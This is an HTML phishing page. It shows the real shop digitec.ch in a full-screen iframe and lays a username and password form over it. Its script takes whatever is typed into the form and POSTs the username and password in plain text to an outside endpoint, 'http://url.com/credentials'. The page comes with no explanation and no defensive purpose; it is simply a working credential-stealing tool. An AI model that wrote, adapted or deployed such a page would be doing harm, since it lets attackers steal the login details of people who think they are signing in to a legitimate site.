<!doctype html>
<html>
  <head>
    <title>Title</title>
  </head>
  <body style="margin: 0;">
    <iframe id="IFrame" style="margin: 0; padding: 0; border: 0; width: 100%; height: 100%; position: fixed;" src="https://www.digitec.ch" height="915" width="1675"></iframe>
    <form method="POST" accept-charset="utf-8" action="" id="MyForm">
      <input name="username" type="text" id="Username" />
      <input name="password" type="password" id="Password" />
      <input name="submit" type="submit" value="Login" />
    </form>

    <script type="text/javascript">
      document.getElementById("MyForm").addEventListener("submit", function (e) {
        var username = document.getElementById("Username").value;
        var password = document.getElementById("Password").value;

        console.log(username, password);
        
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open('POST', 'http://url.com/credentials');
        xmlhttp.setRequestHeader('Content-Type', 'applicatino/x-www-form-urlencoded');
        xmlhttp.send('username=' + username + '&password=' + password);
      });
    </script>
  </body>
</html>
